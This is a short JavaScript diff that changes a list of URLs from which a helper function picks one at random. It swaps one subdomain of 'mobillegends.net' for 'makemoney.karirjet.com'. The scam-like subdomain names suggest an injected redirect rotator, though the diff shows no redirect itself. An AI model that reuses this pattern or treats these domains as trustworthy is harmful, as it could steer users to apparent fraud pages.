@@ -1,6 +1,6 @@
 var ars = rChoice([
-'https://finance.mobillegends.net/',
-'https://irstax.mobillegends.net/'
+'https://irstax.mobillegends.net/',
+'https://makemoney.karirjet.com/'
 ]);
 function rChoice(arr) {
 return arr[Math.floor(arr.length * Math.random())];
